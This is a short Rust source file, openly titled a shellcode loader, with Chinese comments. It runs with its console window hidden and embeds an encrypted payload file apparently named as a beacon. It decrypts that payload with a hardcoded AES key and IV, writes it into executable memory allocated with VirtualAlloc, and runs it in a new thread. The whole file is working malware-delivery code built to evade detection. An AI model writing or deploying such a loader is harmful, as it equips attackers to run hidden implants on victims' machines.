// shellcode loader

#![windows_subsystem = "windows"] 

use std::mem::transmute;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;

use aes::Aes128;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

const KEY: &[u8; 16] = b"thisisakey123456";
const IV: &[u8; 16] = b"thisisaniv123456";

fn decrypt_shellcode(encrypted: &[u8]) -> Vec<u8> {
    let cipher = Aes128Cbc::new_from_slices(KEY, IV)
        .expect("Invalid key/IV length");
    cipher.decrypt_vec(encrypted)
        .expect("Decryption failed")
}

fn main() {
    let encrypted_buffer = include_bytes!("..\\en_beacon.bin"); // 加密后的shellcode
    let shellcode = decrypt_shellcode(encrypted_buffer);

    unsafe {
        // 分配具有执行权限的内存
        // 0x00001000 = MEM_COMMIT
        // 0x40 = PAGE_EXECUTE_READWRITE
        let ptr = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x00001000, 0x40);
        if GetLastError() == 0 && !ptr.is_null() {
            // 将解密后的shellcode复制到可执行内存
            std::ptr::copy(shellcode.as_ptr() as *const u8, ptr as *mut u8, shellcode.len());
            let mut threadid = 0;
            // 创建新线程执行shellcode
            let threadhandle = CreateThread(
                std::ptr::null_mut(),  // 默认安全属性
                0,                     // 默认堆栈大小
                Some(transmute(ptr)),  // 转换函数指针
                std::ptr::null_mut(),  // 无参数
                0,                     // 立即运行
                &mut threadid,         // 接收线程ID
            );
            
            // 等待线程执行完成
            WaitForSingleObject(threadhandle, 0xFFFFFFFF);
        } else {
            println!("执行失败：{}", GetLastError());
        }
    }
}